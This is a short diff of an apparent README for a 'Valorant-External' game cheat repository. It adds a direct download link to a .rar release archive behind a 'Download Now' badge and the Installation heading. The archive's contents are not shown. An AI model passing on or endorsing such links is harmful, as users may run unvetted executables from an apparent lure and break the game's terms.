@@ -12,7 +12,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant5.7/Valorant5.7.rar)
 
 </div>
 
@@ -53,7 +53,7 @@
 
 ---
 
-## [🔧 Installation]()
+## [🔧 Installation](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant5.7/Valorant5.7.rar)
 
 1. **Download** the latest release from the [Releases](../../releases) page.
 2. **Extract** the archive to a folder on your desktop.
